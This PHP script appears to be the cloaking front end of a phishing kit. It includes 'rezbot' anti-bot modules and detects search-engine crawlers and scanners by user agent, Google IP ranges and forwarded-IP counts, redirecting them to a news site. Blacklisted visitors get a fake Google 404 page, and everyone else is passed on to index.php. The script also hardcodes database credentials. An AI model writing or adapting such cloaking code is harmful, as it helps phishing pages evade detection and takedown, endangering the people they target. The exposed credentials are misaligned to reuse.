<?php
include("common/includes.php");
include 'blocker.php';
include 'rezbot/basicbot.php';
include 'rezbot/rezcrawl.php';
include 'rezbot/rezzc.php';
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Liste de mots-clés communs utilisés par les bots
$botKeywords = array(
    'bot', 'spider', 'crawl', 'detect', 'monitor'
);

// Liste d'adresses IP connues pour héberger des bots
$botIPs = array(
    '123.456.78.9', '987.654.32.1',
    // Ajoutez les adresses IP ici
    '8.8.4.0', '8.8.8.0', '8.34.208.0', '8.35.192.0', '23.236.48.0', '23.251.128.0',
    '34.0.0.0', '34.2.0.0', '34.3.0.0', '34.3.3.0', '34.3.4.0', '34.3.8.0', '34.3.16.0',
    '34.3.32.0', '34.3.64.0', '34.3.128.0', '34.4.0.0', '34.8.0.0', '34.16.0.0',
    '34.32.0.0', '34.64.0.0', '34.128.0.0', '35.184.0.0', '35.192.0.0', '35.196.0.0',
    '35.198.0.0', '35.199.0.0', '35.199.128.0', '35.200.0.0', '35.208.0.0', '35.224.0.0',
    '35.240.0.0', '64.15.112.0', '64.233.160.0', '66.22.228.0', '66.102.0.0',
    '66.249.64.0', '70.32.128.0', '72.14.192.0', '74.125.0.0', '104.154.0.0',
    '104.196.0.0', '104.237.160.0', '107.167.160.0', '107.178.192.0', '108.59.80.0',
    '108.170.192.0', '108.177.0.0', '130.211.0.0', '136.112.0.0', '142.250.0.0',
    '146.148.0.0', '162.216.148.0', '162.222.176.0', '172.110.32.0', '172.217.0.0',
    '172.253.0.0', '173.194.0.0', '173.255.112.0', '192.158.28.0', '192.178.0.0',
    '193.186.4.0', '199.36.154.0', '199.36.156.0', '199.192.112.0', '199.223.232.0',
    '207.223.160.0', '208.65.152.0', '208.68.108.0', '208.81.188.0', '208.117.224.0',
    '209.85.128.0', '216.58.192.0', '216.73.80.0', '216.239.32.0', '2001:4860::',
    '2404:6800::', '2404:f340::', '2600:1900::', '2606:73c0::', '2607:f8b0::',
    '2620:11a:a000::', '2620:120:e000::', '2800:3f0::', '2a00:1450::', '2c0f:fb50::'
);

// Liste des User-Agents de robots de Google à bloquer
$googleBotUserAgents = array(
    'Googlebot',
    'Googlebot-News',
    // Ajoutez d'autres User-Agents de robots de Google si nécessaire
);

// Nombre maximal d'adresses IP simultanées autorisées
$maxSimultaneousIPs = 3;

// Vérification basée sur le User-Agent
$isBot = false;

// Vérifier si le User-Agent contient des mots-clés de bot
foreach ($botKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isBot = true;
        break;
    }
}

// Vérification supplémentaire basée sur l'adresse IP
if (!$isBot) {
    // Vérifier si l'adresse IP du visiteur correspond à une adresse IP connue pour héberger des bots
    if (in_array($_SERVER['REMOTE_ADDR'], $botIPs)) {
        $isBot = true;
    }
}

// Vérification des User-Agents de Google
if (!$isBot) {
    $userAgentLower = strtolower($userAgent);
    foreach ($googleBotUserAgents as $botUserAgent) {
        if (stripos($userAgentLower, strtolower($botUserAgent)) !== false) {
            $isBot = true;
            break;
        }
    }
}

// Vérification du nombre maximal d'adresses IP simultanées autorisées
if (!$isBot) {
    $ipList = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) : array($_SERVER['REMOTE_ADDR']);
    $ipList = array_map('trim', $ipList); // Supprimer les espaces autour des adresses IP
    $ipList = array_unique($ipList); // Supprimer les adresses IP en double
    $ipCount = count($ipList);
    if ($ipCount > $maxSimultaneousIPs) {
        $isBot = true;
    }
}

// Rediriger les bots détectés vers la page spécifiée
if ($isBot) {
    header('Location: https://www.mediapart.fr/');
    exit();
}


$bdd = new PDO('mysql:host=mysql4.lwspanel.com;dbname=ligue1076556', 'ligue1076556', '6nsLH29f');


$ip_user = $_SERVER['REMOTE_ADDR'];

$ban_ip = $bdd->prepare("SELECT * FROM ip_blacklist WHERE ip = ?");
$ban_ip->execute(array($ip_user));

$banned = $ban_ip->rowCount();


if($banned == 1) {

?>

<!DOCTYPE html>
<html lang="fr">
<meta charset=utf-8>
<meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width">
<title>Error 404 (Introuvable) !</title>
<style nonce="LWXseTyNporTIj2MLb50INs/E18">
* {
	margin:0;
	padding:0;
}

html,code {
	font:15px/22px arial,sans-serif;
}

html {
	background:#fff;
	color:#222;
	padding:15px;
}

body {
	color:#222;
	text-align:unset;
	margin:7% auto 0;
	max-width:390px;
	min-height:180px;
	padding:30px 0 15px;
}

* > body {
	background:url("https://www.google.com/images/errors/robot.png") 100% 5px no-repeat;
	padding-right:205px;
}

p {
	margin:11px 0 22px;
	overflow:hidden;
}

pre {
	white-space:pre-wrap;
}

ins {
	color:#777;
	text-decoration:none;
}

a img {
	border:0;
}


@media screen and (max-width:772px) {
	body {
		background:none;
		margin-top:0;
		max-width:none;
		padding-right:0;
	}
}

#logo {
	background:url("https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png") no-repeat;
	margin-left:-5px;
}

@media only screen and (min-resolution:192dpi) {
	#logo {
		background:url("https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png") no-repeat 0% 0%/100% 100%;
		moz-border-image:url("https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png") 0;
	}
}

@media only screen and (-webkit-min-device-pixel-ratio:2) {
	#logo{
		background:url("https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png") no-repeat;
		-webkit-background-size:100% 100%;
	}
}

#logo {
	display:inline-block;
	height:54px;
	width:150px
}

</style>

<div id="af-error-container">
	<a href="https://www.google.com/">
		<span id=logo aria-label=Google></span>
	</a>

	<p><b>404.</b>
	<ins>Il s'agit d'une erreur.</ins>
	<p>L'URL demandée est introuvable sur ce serveur.
	<ins>C'est tout ce que nous savons.</ins>
</div>

<?php
}
else {
	header("Location: index.php");
}

?>